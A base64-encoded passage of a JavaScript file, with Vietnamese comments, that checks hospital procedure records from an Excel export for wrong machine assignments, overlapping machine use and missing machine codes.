CAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfSk7DQogICAgICAgIH0NCg0KDQovLyBIw6BtIGtp4buDbSB0cmEgZ+G6r24gc2FpIG3DoXkNCmZ1bmN0aW9uIGNoZWNrTWFjaGluZUVycm9ycyhwcm9jZWR1cmVzLCBqc29uRGF0YSkgew0KICAgIG1hY2hpbmVFcnJvckxvZyA9IFtdOw0KICAgIA0KICAgIGNvbnN0IGhlYWRlckxpbmUxID0ganNvbkRhdGFbN10gfHwgW107DQogICAgY29uc3QgaGVhZGVyTGluZTIgPSBqc29uRGF0YVs4XSB8fCBbXTsNCiAgICBjb25zdCBjb21iaW5lZEhlYWRlcnMgPSBoZWFkZXJMaW5lMS5tYXAoKGNvbCwgaW5kZXgpID0+IA0KICAgICAgICAoY29sICsgJyAnICsgKGhlYWRlckxpbmUyW2luZGV4XSB8fCAnJykpLnRyaW0oKQ0KICAgICk7DQoNCiAgICAvLyBUw6xtIGPhu5l0IG3DoyBtw6F5DQogICAgY29uc3QgbWFjaGluZUNvZGVJbmRleCA9IGNvbWJpbmVkSGVhZGVycy5maW5kSW5kZXgoaCA9PiANCiAgICAgICAgaC5pbmNsdWRlcygiTcOjIG3DoXkiKSB8fCBoLmluY2x1ZGVzKCJNw6MgbcOheSB0aGVvIHRo4bunIHRodeG6rXQiKQ0KICAgICk7DQogICAgIC8vIFTDrG0gY+G7mXQgYsOhYyBz4bu5IGNo4buJIMSR4buLbmgNCiAgICBjb25zdCBkb2N0b3JJbmRleCA9IGNvbWJpbmVkSGVhZGVycy5maW5kSW5kZXgoaCA9PiBoLmluY2x1ZGVzKCJCw6FjIHPhu7kgY2jhu4kgxJHhu4tuaCIpKTsNCiAgIA0KICAgIGlmIChtYWNoaW5lQ29kZUluZGV4ID09PSAtMSkgew0KICAgICAgICBjb25zb2xlLmxvZygiS2jDtG5nIHTDrG0gdGjhuqV5IGPhu5l0IG3DoyBtw6F5IHRyb25nIGZpbGUgRXhjZWwiKTsNCiAgICAgICAgcmV0dXJuOw0KICAgIH0NCg0KICAgIC8vIFTDrG0gY8OhYyBj4buZdCBraMOhYyBj4bqnbiB0aGnhur90DQogICAgY29uc3QgcHJvY2VkdXJlSW5kZXggPSBjb21iaW5lZEhlYWRlcnMuZmluZEluZGV4KGggPT4gaC5pbmNsdWRlcygiVGjhu6cgdGh14bqtdCIpKTsNCiAgICBjb25zdCBuYW1lSW5kZXggPSBjb21iaW5lZEhlYWRlcnMuZmluZEluZGV4KGggPT4gaC5pbmNsdWRlcygiSOG7jSB0w6puIikpOw0KCWNvbnN0IHBhdGllbnRJZEluZGV4ID0gY29tYmluZWRIZWFkZXJzLmZpbmRJbmRleChoID0+IGguaW5jbHVkZXMoIk3DoyBCTiIpKTsNCgljb25zdCBwYXRpZW50YWdlSW5kZXggPSBjb21iaW5lZEhlYWRlcnMuZmluZEluZGV4KGggPT4gaC5pbmNsdWRlcygiVHXhu5VpIikpOw0KICAgIGNvbnN0IG9wZXJhdG9ySW5kZXggPSBjb21iaW5lZEhlYWRlcnMuZmluZEluZGV4KGggPT4gaC5pbmNsdWRlcygiVGjhu6cgdGh14bqtdCBjaMOtbmgiKSk7DQogICAgY29uc3Qgc3RhcnRJbmRleCA9IGNvbWJpbmVkSGVhZGVycy5maW5kSW5kZXgoaCA9PiBoLmluY2x1ZGVzKCJUaOG7nWkgZ2lhbiBi4bqvdCDEkeG6p3UgdGjhu7FjIGhp4buHbiIpKTsNCiAgICBjb25zdCBlbmRJbmRleCA9IGNvbWJpbmVkSGVhZGVycy5maW5kSW5kZXgoaCA9PiBoLmluY2x1ZGVzKCJUaOG7nWkgZ2lhbiBr4bq/dCB0aMO6YyIpKTsNCg0KICAgIGNvbnN0IHJvd3MgPSBqc29uRGF0YS5zbGljZSg5KTsNCiAgICANCiAgICByb3dzLmZvckVhY2goKHJvdywgaW5kZXgpID0+IHsNCiAgICAgICAgY29uc3Qgcm93TnVtYmVyID0gaW5kZXggKyAxMDsNCiAgICAgICAgDQogICAgICAgIHRyeSB7DQogICAgICAgICAgICBpZiAoIXJvdyB8fCByb3cubGVuZ3RoID09PSAwKSByZXR1cm47DQogICAgICAgICAgICANCiAgICAgICAgICAgIGNvbnN0IHByb2NlZHVyZU5hbWUgPSByb3dbcHJvY2VkdXJlSW5kZXhdOw0KICAgICAgICAgICAgaWYgKCFwcm9jZWR1cmVOYW1lIHx8ICFQUk9DRURVUkVTW3Byb2NlZHVyZU5hbWVdKSByZXR1cm47DQogICAgICAgICAgICANCiAgICAgICAgICAgIGNvbnN0IG1hY2hpbmVDb2RlID0gKHJvd1ttYWNoaW5lQ29kZUluZGV4XSB8fCAnJykudG9TdHJpbmcoKS50cmltKCk7DQogICAgICAgICAgICBjb25zdCBwcm9jZWR1cmVJbmZvID0gUFJPQ0VEVVJFU1twcm9jZWR1cmVOYW1lXTsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgLy8gQ2jhu4kga2nhu4NtIHRyYSAzIHRo4bunIHRodeG6rXQgY8OzIG1hY2hpbmVDb2RlDQogICAgICAgICAgICBpZiAoIXByb2NlZHVyZUluZm8ubWFjaGluZUNvZGUpIHJldHVybjsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgY29uc3QgZXhwZWN0ZWRDb2RlcyA9IEFycmF5LmlzQXJyYXkocHJvY2VkdXJlSW5mby5tYWNoaW5lQ29kZSkgDQogICAgICAgICAgICAgICAgPyBwcm9jZWR1cmVJbmZvLm1hY2hpbmVDb2RlIA0KICAgICAgICAgICAgICAgIDogW3Byb2NlZHVyZUluZm8ubWFjaGluZUNvZGVdOw0KICAgICAgICAgICAgDQogICAgICAgICAgICAvLyBLaeG7g20gdHJhIHhlbSBtw6MgbcOheSBjw7MgY2jhu6lhIGLhuqV0IGvhu7MgbcOjIGV4cGVjdGVkIG7DoG8ga2jDtG5nDQogICAgICAgICAgICBjb25zdCBpc1ZhbGlkTWFjaGluZSA9IGV4cGVjdGVkQ29kZXMuc29tZShjb2RlID0+IA0KICAgICAgICAgICAgICAgIG1hY2hpbmVDb2RlLnRvVXBwZXJDYXNlKCkuaW5jbHVkZXMoY29kZS50b1VwcGVyQ2FzZSgpKQ0KICAgICAgICAgICAgKTsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgaWYgKCFpc1ZhbGlkTWFjaGluZSAmJiBtYWNoaW5lQ29kZSAhPT0gJycpIHsNCiAgICAgICAgICAgICAgICBjb25zdCBzdGFydCA9IHBhcnNlRGF0ZVRpbWUocm93W3N0YXJ0SW5kZXhdLCByb3dOdW1iZXIpOw0KICAgICAgICAgICAgICAgIGNvbnN0IGVuZCA9IHBhcnNlRGF0ZVRpbWUocm93W2VuZEluZGV4XSwgcm93TnVtYmVyKTsNCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAvLyBYw6FjIMSR4buLbmggdGjDtG5nIGLDoW8gbOG7l2kgY+G7pSB0aOG7gyBk4buxYSB0csOqbiBtw6MgbcOheSBuaOG6rXAgc2FpDQogICAgICAgICAgICAgICAgbGV0IGVycm9yTWVzc2FnZSA9ICdH4bqvbiBuaOG6p20gbcOheSBjaMawYSB4w6FjIMSR4buLbmgnOw0KICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIGlmIChtYWNoaW5lQ29kZS50b1VwcGVyQ2FzZSgpLmluY2x1ZGVzKCdNxJBDJykpIHsNCiAgICAgICAgICAgICAgICAgICAgZXJyb3JNZXNzYWdlID0gJ0fhuq9uIG5o4bqnbSBtw6F5IMSRaeG7h24gY2jDom0gcuG7k2knOw0KICAgICAgICAgICAgICAgIH0gZWxzZSBpZiAobWFjaGluZUNvZGUudG9VcHBlckNhc2UoKS5pbmNsdWRlcygnxJBITicpKSB7DQogICAgICAgICAgICAgICAgICAgIGVycm9yTWVzc2FnZSA9ICdH4bqvbiBuaOG6p20gxJHDqG4gaOG7k25nIG5nb+G6oWkgcuG7k2knOw0KICAgICAgICAgICAgICAgIH0gZWxzZSBpZiAobWFjaGluZUNvZGUudG9VcHBlckNhc2UoKS5pbmNsdWRlcygnR0gnKSB8fCBtYWNoaW5lQ29kZS50b1VwcGVyQ2FzZSgpLmluY2x1ZGVzKCdPR0gnKSkgew0KICAgICAgICAgICAgICAgICAgICBlcnJvck1lc3NhZ2UgPSAnR+G6r24gbmjhuqdtIG3DoXkgZ2nDoWMgaMahaSBy4buTaSc7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIG1hY2hpbmVFcnJvckxvZy5wdXNoKHsNCiAgICAgICAgICAgICAgICAgICAgcm93TnVtYmVyOiByb3dOdW1iZXIsDQogICAgICAgICAgICAgICAgICAgIHBhdGllbnROYW1lOiBuYW1lSW5kZXggIT09IC0xID8gcm93W25hbWVJbmRleF0gfHwgJ0tow7RuZyBjw7MnIDogJ0tow7RuZyBjw7MnLA0KICAgICAgICAgICAgICAgICAgICBwYXRpZW50SWQ6IHBhdGllbnRJZEluZGV4ICE9PSAtMSA/IHJvd1twYXRpZW50SWRJbmRleF0gfHwgJ0tow7RuZyBjw7MnIDogJ0tow7RuZyBjw7MnLA0KICAgICAgICAgICAgICAgICAgICBwYXRpZW50QWdlOiBwYXRpZW50YWdlSW5kZXggIT09IC0xID8gcm93W3BhdGllbnRhZ2VJbmRleF0gfHwgJ0tow7RuZyBjw7MnIDogJ0tow7RuZyBjw7MnLCAgICAgDQoJCQkJCXByb2NlZHVyZTogcHJvY2VkdXJlTmFtZSwNCiAgICAgICAgICAgICAgICAgICAgb3BlcmF0b3I6IG9wZXJhdG9ySW5kZXggIT09IC0xID8gcm93W29wZXJhdG9ySW5kZXhdIHx8ICdLaMO0bmcgY8OzJyA6ICdLaMO0bmcgY8OzJywNCgkJCQkJZG9jdG9yOiBkb2N0b3JJbmRleCAhPT0gLTEgPyByb3dbZG9jdG9ySW5kZXhdIHx8ICdLaMO0bmcgY8OzJyA6ICdLaMO0bmcgY8OzJywgLy8gVGjDqm0gYsOhYyBz4bu5DQogICAgICAgICAgICAgICAgICAgIGRhdGU6IHN0YXJ0Py5kYXRlS2V5IHx8ICdLaMO0bmcgeMOhYyDEkeG7i25oJywNCiAgICAgICAgICAgICAgICAgICAgc3RhcnRUaW1lOiBzdGFydD8uZGlzcGxheVRpbWUgfHwgJz8/JywNCiAgICAgICAgICAgICAgICAgICAgZW5kVGltZTogZW5kPy5kaXNwbGF5VGltZSB8fCAnPz8nLA0KICAgICAgICAgICAgICAgICAgICBtYWNoaW5lQ29kZTogbWFjaGluZUNvZGUsDQogICAgICAgICAgICAgICAgICAgIGV4cGVjdGVkQ29kZXM6IGV4cGVjdGVkQ29kZXMuam9pbignIGhv4bq3YyAnKSwNCiAgICAgICAgICAgICAgICAgICAgbWVzc2FnZTogZXJyb3JNZXNzYWdlIC8vIFPhu60gZOG7pW5nIHRow7RuZyBiw6FvIGPhu6UgdGjhu4MNCiAgICAgICAgICAgICAgICB9KTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfSBjYXRjaCAoZXJyb3IpIHsNCiAgICAgICAgICAgIGNvbnNvbGUuZXJyb3IoYEzhu5dpIGtp4buDbSB0cmEgbcOheSBkw7JuZyAke3Jvd051bWJlcn06YCwgZXJyb3IpOw0KICAgICAgICB9DQogICAgfSk7DQp9DQoNCi8vIEjDoG0ga2nhu4NtIHRyYSB4dW5nIMSR4buZdCBtw6F5DQpmdW5jdGlvbiBjaGVja01hY2hpbmVDb25mbGljdHMocHJvY2VkdXJlcywganNvbkRhdGEpIHsNCiAgICBtYWNoaW5lQ29uZmxpY3RMb2cgPSBbXTsNCiAgICANCiAgICBjb25zdCBoZWFkZXJMaW5lMSA9IGpzb25EYXRhWzddIHx8IFtdOw0KICAgIGNvbnN0IGhlYWRlckxpbmUyID0ganNvbkRhdGFbOF0gfHwgW107DQogICAgY29uc3QgY29tYmluZWRIZWFkZXJzID0gaGVhZGVyTGluZTEubWFwKChjb2wsIGluZGV4KSA9PiANCiAgICAgICAgKGNvbCArICcgJyArIChoZWFkZXJMaW5lMltpbmRleF0gfHwgJycpKS50cmltKCkNCiAgICApOw0KDQogICAgLy8gVMOsbSBj4buZdCBtw6MgbcOheQ0KICAgIGNvbnN0IG1hY2hpbmVDb2RlSW5kZXggPSBjb21iaW5lZEhlYWRlcnMuZmluZEluZGV4KGggPT4gDQogICAgICAgIGguaW5jbHVkZXMoIk3DoyBtw6F5IikgfHwgaC5pbmNsdWRlcygiTcOjIG3DoXkgdGhlbyB0aOG7pyB0aHXhuq10IikNCiAgICApOw0KICAgICAvLyBUw6xtIGPhu5l0IGLDoWMgc+G7uSBjaOG7iSDEkeG7i25oDQogICAgY29uc3QgZG9jdG9ySW5kZXggPSBjb21iaW5lZEhlYWRlcnMuZmluZEluZGV4KGggPT4gaC5pbmNsdWRlcygiQsOhYyBz4bu5IGNo4buJIMSR4buLbmgiKSk7DQogICAgDQogICAgaWYgKG1hY2hpbmVDb2RlSW5kZXggPT09IC0xKSB7DQogICAgICAgIGNvbnNvbGUubG9nKCJLaMO0bmcgdMOsbSB0aOG6pXkgY+G7mXQgbcOjIG3DoXkiKTsNCiAgICAgICAgcmV0dXJuOw0KICAgIH0NCg0KICAgIGNvbnN0IHJvd3MgPSBqc29uRGF0YS5zbGljZSg5KTsNCiAgICBjb25zdCBtYWNoaW5lUHJvY2VkdXJlcyA9IFtdOw0KICAgIA0KICAgIC8vIEzhu41jIGPDoWMgdGjhu6cgdGh14bqtdCBjw7Mgc+G7rSBk4bulbmcgbcOheQ0KICAgIHJvd3MuZm9yRWFjaCgocm93LCBpbmRleCkgPT4gew0KICAgICAgICBjb25zdCByb3dOdW1iZXIgPSBpbmRleCArIDEwOw0KICAgICAgICANCiAgICAgICAgdHJ5IHsNCiAgICAgICAgICAgIGlmICghcm93IHx8IHJvdy5sZW5ndGggPT09IDApIHJldHVybjsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgY29uc3QgcHJvY2VkdXJlTmFtZSA9IHJvd1tjb21iaW5lZEhlYWRlcnMuZmluZEluZGV4KGggPT4gaC5pbmNsdWRlcygiVGjhu6cgdGh14bqtdCIpKV07DQogICAgICAgICAgICBpZiAoIXByb2NlZHVyZU5hbWUgfHwgIVBST0NFRFVSRVNbcHJvY2VkdXJlTmFtZV0pIHJldHVybjsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgY29uc3QgcHJvY2VkdXJlSW5mbyA9IFBST0NFRFVSRVNbcHJvY2VkdXJlTmFtZV07DQogICAgICAgICAgICBpZiAoIXByb2NlZHVyZUluZm8ubWFjaGluZUNvZGUpIHJldHVybjsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgY29uc3QgbWFjaGluZUNvZGUgPSAocm93W21hY2hpbmVDb2RlSW5kZXhdIHx8ICcnKS50b1N0cmluZygpLnRyaW0oKTsNCiAgICAgICAgICAgIGlmICghbWFjaGluZUNvZGUpIHJldHVybjsNCiAgICAgDQogICAgICAgICAgICBjb25zdCBuYW1lSW5kZXggPSBjb21iaW5lZEhlYWRlcnMuZmluZEluZGV4KGggPT4gaC5pbmNsdWRlcygiSOG7jSB0w6puIikpOw0KCQkgICAgY29uc3QgcGF0aWVudElkSW5kZXggPSBjb21iaW5lZEhlYWRlcnMuZmluZEluZGV4KGggPT4gaC5pbmNsdWRlcygiTcOjIEJOIikpOw0KCQkJY29uc3QgcGF0aWVudGFnZUluZGV4ID0gY29tYmluZWRIZWFkZXJzLmZpbmRJbmRleChoID0+IGguaW5jbHVkZXMoIlR14buVaSIpKTsNCiAgICAgICAgICAgIGNvbnN0IG9wZXJhdG9ySW5kZXggPSBjb21iaW5lZEhlYWRlcnMuZmluZEluZGV4KGggPT4gaC5pbmNsdWRlcygiVGjhu6cgdGh14bqtdCBjaMOtbmgiKSk7DQogICAgICAgICAgICBjb25zdCBzdGFydEluZGV4ID0gY29tYmluZWRIZWFkZXJzLmZpbmRJbmRleChoID0+IGguaW5jbHVkZXMoIlRo4budaSBnaWFuIGLhuq90IMSR4bqndSB0aOG7sWMgaGnhu4duIikpOw0KICAgICAgICAgICAgY29uc3QgZW5kSW5kZXggPSBjb21iaW5lZEhlYWRlcnMuZmluZEluZGV4KGggPT4gaC5pbmNsdWRlcygiVGjhu51pIGdpYW4ga+G6v3QgdGjDumMiKSk7DQogICAgICAgICAgICANCiAgICAgICAgICAgIGNvbnN0IHN0YXJ0ID0gcGFyc2VEYXRlVGltZShyb3dbc3RhcnRJbmRleF0sIHJvd051bWJlcik7DQogICAgICAgICAgICBjb25zdCBlbmQgPSBwYXJzZURhdGVUaW1lKHJvd1tlbmRJbmRleF0sIHJvd051bWJlcik7DQogICAgICAgICAgICANCiAgICAgICAgICAgIGlmIChzdGFydCAmJiBlbmQpIHsNCiAgICAgICAgICAgICAgICBtYWNoaW5lUHJvY2VkdXJlcy5wdXNoKHsNCiAgICAgICAgICAgICAgICAgICAgcm93TnVtYmVyOiByb3dOdW1iZXIsDQogICAgICAgICAgICAgICAgICAgIHBhdGllbnROYW1lOiBuYW1lSW5kZXggIT09IC0xID8gcm93W25hbWVJbmRleF0gfHwgJ0tow7RuZyBjw7MnIDogJ0tow7RuZyBjw7MnLA0KCQkJCQlwYXRpZW50SWQ6IHBhdGllbnRJZEluZGV4ICE9PSAtMSA/IHJvd1twYXRpZW50SWRJbmRleF0gfHwgJ0tow7RuZyBjw7MnIDogJ0tow7RuZyBjw7MnLA0KCQkJCQlwYXRpZW50QWdlOiBwYXRpZW50YWdlSW5kZXggIT09IC0xID8gcm93W3BhdGllbnRhZ2VJbmRleF0gfHwgJ0tow7RuZyBjw7MnIDogJ0tow7RuZyBjw7MnLA0KICAgICAgICAgICAgICAgICAgICBwcm9jZWR1cmU6IHByb2NlZHVyZU5hbWUsDQogICAgICAgICAgICAgICAgICAgIG9wZXJhdG9yOiBvcGVyYXRvckluZGV4ICE9PSAtMSA/IHJvd1tvcGVyYXRvckluZGV4XSB8fCAnS2jDtG5nIGPDsycgOiAnS2jDtG5nIGPDsycsDQoJCQkJCWRvY3RvcjogZG9jdG9ySW5kZXggIT09IC0xID8gcm93W2RvY3RvckluZGV4XSB8fCAnS2jDtG5nIGPDsycgOiAnS2jDtG5nIGPDsycsIC8vIFRow6ptIGLDoWMgc+G7uQ0KICAgICAgICAgICAgICAgICAgICBkYXRlOiBzdGFydC5kYXRlS2V5LA0KICAgICAgICAgICAgICAgICAgICBzdGFydDogc3RhcnQuc2Vjb25kcywNCiAgICAgICAgICAgICAgICAgICAgZW5kOiBlbmQuc2Vjb25kcywNCiAgICAgICAgICAgICAgICAgICAgZGlzcGxheVN0YXJ0OiBzdGFydC5kaXNwbGF5VGltZSwNCiAgICAgICAgICAgICAgICAgICAgZGlzcGxheUVuZDogZW5kLmRpc3BsYXlUaW1lLA0KICAgICAgICAgICAgICAgICAgICBtYWNoaW5lQ29kZTogbWFjaGluZUNvZGUsDQogICAgICAgICAgICAgICAgICAgIHByb2NlZHVyZUluZm86IHByb2NlZHVyZUluZm8NCiAgICAgICAgICAgICAgICB9KTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfSBjYXRjaCAoZXJyb3IpIHsNCiAgICAgICAgICAgIGNvbnNvbGUuZXJyb3IoYEzhu5dpIHjhu60gbMO9IG3DoXkgZMOybmcgJHtyb3dOdW1iZXJ9OmAsIGVycm9yKTsNCiAgICAgICAgfQ0KICAgIH0pOw0KICAgIA0KICAgIC8vIEtp4buDbSB0cmEgeHVuZyDEkeG7mXQgdGhlbyB04burbmcgbcOheSBWw4AgdOG7q25nIG5nw6B5DQogICAgY29uc3QgbWFjaGluZUdyb3VwcyA9IHt9Ow0KICAgIA0KICAgIG1hY2hpbmVQcm9jZWR1cmVzLmZvckVhY2gocHJvYyA9PiB7DQogICAgICAgIGNvbnN0IGtleSA9IGAke3Byb2MubWFjaGluZUNvZGV9XyR7cHJvYy5kYXRlfWA7IC8vIEvhur90IGjhu6NwIG3DoyBtw6F5ICsgbmfDoHkNCiAgICAgICAgaWYgKCFtYWNoaW5lR3JvdXBzW2tleV0pIHsNCiAgICAgICAgICAgIG1hY2hpbmVHcm91cHNba2V5XSA9IFtdOw0KICAgICAgICB9DQogICAgICAgIG1hY2hpbmVHcm91cHNba2V5XS5wdXNoKHByb2MpOw0KICAgIH0pOw0KICAgIA0KICAgIE9iamVjdC52YWx1ZXMobWFjaGluZUdyb3VwcykuZm9yRWFjaChwcm9jZWR1cmVzID0+IHsNCiAgICAgICAgaWYgKHByb2NlZHVyZXMubGVuZ3RoIDwgMikgcmV0dXJuOw0KICAgICAgICANCiAgICAgICAgcHJvY2VkdXJlcy5zb3J0KChhLCBiKSA9PiBhLnN0YXJ0IC0gYi5zdGFydCk7DQogICAgICAgIA0KICAgICAgICBmb3IgKGxldCBpID0gMTsgaSA8IHByb2NlZHVyZXMubGVuZ3RoOyBpKyspIHsNCiAgICAgICAgICAgIGNvbnN0IHByZXYgPSBwcm9jZWR1cmVzW2kgLSAxXTsNCiAgICAgICAgICAgIGNvbnN0IGN1cnJlbnQgPSBwcm9jZWR1cmVzW2ldOw0KICAgICAgICAgICAgDQogICAgICAgICAgICAvLyBLaeG7g20gdHJhIHhlbSBjw7MgeHVuZyDEkeG7mXQgdGjhu51pIGdpYW4ga2jDtG5nDQogICAgICAgICAgICBpZiAoY3VycmVudC5zdGFydCA8IHByZXYuZW5kKSB7DQogICAgICAgICAgICAgICAgbWFjaGluZUNvbmZsaWN0TG9nLnB1c2goew0KICAgICAgICAgICAgICAgICAgICBtYWNoaW5lQ29kZTogcHJldi5tYWNoaW5lQ29kZSwNCiAgICAgICAgICAgICAgICAgICAgZGF0ZTogcHJldi5kYXRlLCAvLyBUaMOqbSBuZ8OgeSDEkeG7gyBoaeG7g24gdGjhu4sNCiAgICAgICAgICAgICAgICAgICAgY29uZmxpY3RQcm9jZWR1cmVzOiBbcHJldiwgY3VycmVudF0sDQogICAgICAgICAgICAgICAgICAgIG1lc3NhZ2U6IGBNw6F5ICR7cHJldi5tYWNoaW5lQ29kZX0gxJHGsOG7o2Mgc+G7rSBk4bulbmcgxJHhu5NuZyB0aOG7nWkgY2hvIG5oaeG7gXUgYuG7h25oIG5ow6JuIHRyb25nIG5nw6B5ICR7cHJldi5kYXRlfWANCiAgICAgICAgICAgICAgICB9KTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgIH0pOw0KfQ0KZnVuY3Rpb24gY2hlY2tNaXNzaW5nTWFjaGluZUNvZGVzKHByb2NlZHVyZXMsIGpzb25EYXRhKSB7DQogICAgbWlzc2luZ01hY2hpbmVMb2cgPSBbXTsNCiAgICANCiAgICBjb25zdCBoZWFkZXJMaW5lMSA9IGpzb25EYXRhWzddIHx8IFtdOw0KICAgIGNvbnN0IGhlYWRlckxpbmUyID0ganNvbkRhdGFbOF0gfHwgW107DQogICAgY29uc3QgY29tYmluZWRIZWFkZXJzID0gaGVhZGVyTGluZTEubWFwKChjb2wsIGluZGV4KSA9PiANCiAgICAgICAgKGNvbCArICcgJyArIChoZWFkZXJMaW5lMltpbmRleF0gfHwgJycpKS50cmltKCkNCiAgICApOw0KDQogICAgLy8gVMOsbSBj4buZdCBtw6MgbcOheQ0KICAgIGNvbnN0IG1hY2hpbmVDb2RlSW5kZXggPSBjb21iaW5lZEhlYWRlcnMuZmluZEluZGV4KGggPT4gDQogICAgICAgIGguaW5jbHVkZXMoIk3DoyBtw6F5IikgfHwgaC5pbmNsdWRlcygiTcOjIG3DoXkgdGhlbyB0aOG7pyB0aHXhuq10IikNCiAgICApOw0KICAgICAgLy8gVMOsbSBj4buZdCBiw6FjIHPhu7kgY2jhu4kgxJHhu4tuaA0KICAgIGNvbnN0IGRvY3RvckluZGV4ID0gY29tYmluZWRIZWFkZXJzLmZpbmRJbmRleChoID0+IGguaW5jbHVkZXMoIkLDoWMgc+G7uSBjaOG7iSDEkeG7i25oIikpOw0KDQogICAgaWYgKG1hY2hpbmVDb2RlSW5kZXggPT09IC0xKSB7DQogICAgICAgIGNvbnNvbGUubG9nKCJLaMO0bmcgdMOsbSB0aOG6pXkgY+G7mXQgbcOjIG3DoXkgdHJvbmcgZmlsZSBFeGNlbCIpOw0KICAgICAgICByZXR1cm47DQogICAgfQ0KDQogICAgLy8gVMOsbSBjw6FjIGPhu5l0IGtow6FjIGPhuqduIHRoaeG6v3QNCiAgICBjb25zdCBwcm9jZWR1cmVJbmRleCA9IGNvbWJpbmVkSGVhZGVycy5maW5kSW5kZXgoaCA9PiBoLmluY2x1ZGVzKCJUaOG7pyB0aHXhuq10IikpOw0KICAgIGNvbnN0IG5hbWVJbmRleCA9IGNvbWJpbmVkSGVhZGVycy5maW5kSW5kZXgoaCA9PiBoLmluY2x1ZGVzKCJI4buNIHTDqm4iKSk7DQoJY29uc3QgcGF0aWVudElkSW5kZXggPSBjb21iaW5lZEhlYWRlcnMuZmluZEluZGV4KGggPT4gaC5pbmNsdWRlcygiTcOjIEJOIikpOw0KCWNvbnN0IHBhdGllbnRhZ2VJbmRleCA9IGNvbWJpbmVkSGVhZGVycy5maW5kSW5kZXgoaCA9PiBoLmluY2x1ZGVzKCJUdeG7lWkiKSk7DQogICAgY29uc3Qgb3BlcmF0b3JJbmRleCA9IGNvbWJpbmVkSGVhZGVycy5maW5kSW5kZXgoaCA9PiBoLmluY2x1ZGVzKCJUaOG7pyB0aHXhuq10IGNow61uaCIpKTsNCiAgICBjb25zdCBzdGFydEluZGV4ID0gY29tYmluZWRIZWFkZXJzLmZpbmRJbmRleChoID0+IGguaW5jbHVkZXMoIlRo4budaSBnaWFuIGLhuq90IMSR4bqndSB0aOG7sWMgaGnhu4duIikpOw0KICAgIGNvbnN0IGVuZEluZGV4ID0gY29tYmluZWRIZWFkZXJzLmZpbmRJbmRleChoID0+IGguaW5jbHVkZXMoIlRo4budaSBnaWFuIGvhur90IHRow7pjIikpOw0KICAgIGNvbnN0IGRhdGVJbmRleCA9IGNvbWJpbmVkSGVhZGVycy5maW5kSW5kZXgoaCA9PiBoLmluY2x1ZGVzKCJOZ8OgeSB0aOG7sWMgaGnhu4duIikpOw0KDQogICAgY29uc3Qgcm93cyA9IGpzb25EYXRhLnNsaWNlKDkpOw0KICAgIA0KICAgIC8vIERhbmggc8OhY2ggdGjhu6cgdGh14bqtdCBj4bqnbiBraeG7g20gdHJhIG3DoyBtw6F5DQogICAgY29uc3QgcHJvY2VkdXJlc1RvQ2hlY2sgPSBbDQogICAgICAgICLEkWnhu4duIGNow6JtIFtraW0gbmfhuq9uXSIsDQogICAgICAgICLEkWnhu4F1IHRy4buLIGLhurFuZyB0aWEgaOG7k25nIG5nb+G6oWkiLCANCiAgICAgICAgImdpw6FjIGjGoWkiDQogICAgXTsNCiAgICANCiAgICByb3dzLmZvckVhY2goKHJvdywgaW5kZXgpID0+IHsNCiAgICAgICAgY29uc3Qgcm93TnVtYmVyID0gaW5kZXggKyAxMDsNCiAgICAgICAgDQogICAgICAgIHRyeSB7DQogICAgICAgICAgICBpZiAoIXJvdyB8fCByb3cubGVuZ3RoID09PSAwKSByZXR1cm47DQogICAgICAgICAgICANCiAgICAgICAgICAgIGNvbnN0IHByb2NlZHVyZU5hbWUgPSAocm93W3Byb2NlZHVyZUluZGV4XSB8fCAnJykudG9TdHJpbmcoKS50cmltKCk7DQogICAgICAgICAgICBpZiAoIXByb2NlZHVyZU5hbWUpIHJldHVybjsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgLy8gS2nhu4NtIHRyYSB4ZW0gdGjhu6cgdGh14bqtdCBjw7MgdHJvbmcgZGFuaCBzw6FjaCBj4bqnbiBraeG7g20gdHJhIGtow7RuZw0KICAgICAgICAgICAgY29uc3Qgc2hvdWxkQ2hlY2sgPSBwcm9jZWR1cmVzVG9DaGVjay5zb21lKHByb2MgPT4gDQogICAgICAgICAgICAgICAgcHJvY2VkdXJlTmFtZS50b0xvd2VyQ2FzZSgpLmluY2x1ZGVzKHByb2MudG9Mb3dlckNhc2UoKSkNCiAgICAgICAgICAgICk7DQogICAgICAgICAgICANCiAgICAgICAgICAgIGlmICghc2hvdWxkQ2hlY2spIHJldHVybjsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgY29uc3QgbWFjaGluZUNvZGUgPSAocm93W21hY2hpbmVDb2RlSW5kZXhdIHx8ICcnKS50b1N0cmluZygpLnRyaW0oKTsNCiAgICAgICAgICAgIGNvbnN0IHByb2NlZHVyZURhdGUgPSBkYXRlSW5kZXggIT09IC0xID8gKHJvd1tkYXRlSW5kZXhdIHx8ICcnKS50b1N0cmluZygpLnRyaW0oKSA6ICcnOw0KICAgICAgICAgICAgY29uc3Qgc3RhcnRUaW1lVmFsdWUgPSAocm93W3N0YXJ0SW5kZXhdIHx8ICcnKS50b1N0cmluZygpLnRyaW0oKTsNCiAgICAgICAgICAgIC8vIE7hur91IG3DoyBtw6F5IHRy4buRbmcgdGjDrCBiw6FvIGzhu5dpDQogICAgICAgICAgICBpZiAoIW1hY2hpbmVDb2RlICYmIHN0YXJ0VGltZVZhbHVlKSB7DQogICAgICAgICAgICAgICAgY29uc3Qgc3RhcnQgPSBwYXJzZURhdGVUaW1lKHJvd1tzdGFydEluZGV4XSwgcm93TnVtYmVyKTsNCiAgICAgICAgICAgICAgICBjb25zdCBlbmQgPSBwYXJzZURhdGVUaW1lKHJvd1tlbmRJbmRleF0sIHJvd051bWJlcik7DQogICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgbWlzc2luZ01hY2h